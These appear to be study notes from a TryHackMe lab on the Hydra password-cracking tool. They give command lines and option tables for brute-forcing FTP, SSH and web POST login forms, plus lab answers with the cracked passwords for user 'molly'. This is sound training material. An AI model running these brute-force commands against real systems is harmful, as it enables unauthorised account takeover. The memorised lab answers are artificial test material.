#Hydra

https://github.com/vanhauser-thc/thc-hydra

https://tryhackme.com/room/hydra

##FTP

The options we pass into Hydra depends on which service (protocol) we're attacking. For example if we wanted to bruteforce FTP with the username being user and a password list being passlist.txt, we'd use the following command:

    hydra -l user -P passlist.txt ftp://MACHINE_IP

##SSH

    hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh

##Post Web Form

We can use Hydra to bruteforce web forms too, you will have to make sure you know which type of request its making - a GET or POST methods are normally used. You can use your browsers network tab (in developer tools) to see the request types, or simply view the source code.

Below is an example Hydra command to brute force a POST login form:

    hydra -l <username> -P <wordlist> 10.10.169.4 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

|Option         |Description|
|---|---|
|-l             |Single username|
|-P             |indicates use the following password list|
|http-post-form |indicsates the type of from (post)|
|/login url     |the login page URL|
|:username      |the form field where the username is entered|
|^USER^         |tells Hydra to use the username|
|password       |the form field where the password list supplied earlier|
|^PASS^         |tells Hydra to use the password list supplied earlier|
|Login          |indicates to Hydra the Login failed message|
|Login failed   |is the login failure message that the form returns|
|F=incorrect    |If this word appears on the page, its incorrect|
|-V             |verbose output for every attempt|

###Example

####Post Web Form

    hydra -l molly -P wordlists/rockyou.txt 10.10.169.4 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -V

Login:molly password:sunshine

####SSH

    hydra -l molly -P wordlists/rockyou.txt 10.10.169.4 -t4 -V ssh

Login:molly password:butterfly

---

https://github.com/vanhauser-thc/thc-hydra

Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more. Hydra comes by default on both Parrot and Kali, however if you need it, you can find the GitHub here.

The syntax for the command we're going to use to find the passwords is this:

    hydra -t 4 -l <Username> -P /<Path>/rockyou.txt -vV <IP> <Protocol: ssh, ftp, udp,...>

Let's break it down:

|SECTION                 |FUNCTION|
|---|---|
|hydra                   |Runs the hydra tool|
|-t 4                    |Number of parallel connections per target|
|-l [user]               |Points to the user who's account you're trying to compromise|
|-P [path to dictionary] |Points to the file containing the list of possible passwords|
|-vV                     |Sets verbose mode to very verbose, shows the login+pass combination for each attempt|
|[machine IP]            |The IP address of the target machine|
|ftp / protocol          |Sets the protocol|

Let's crack some passwords!

